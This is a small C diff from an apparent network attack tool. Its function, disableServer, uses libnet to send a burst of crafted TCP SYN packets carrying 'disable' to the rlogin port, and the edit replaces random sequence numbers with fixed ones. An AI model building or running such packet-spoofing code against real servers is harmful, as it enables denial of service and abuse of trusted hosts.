@@ -8,7 +8,7 @@ void disableServer(libnet_t *l,u_long sniffIp, u_long serverIp)
     for(int i=0; i<11; i++)
     {   
         tcpTagCreate(l,libnet_get_prand(LIBNET_PRu16),(u_int16_t)513,
-                                    libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),
+                                    1+i,0,
                                     "disable", 7,
                                     TH_SYN);
 
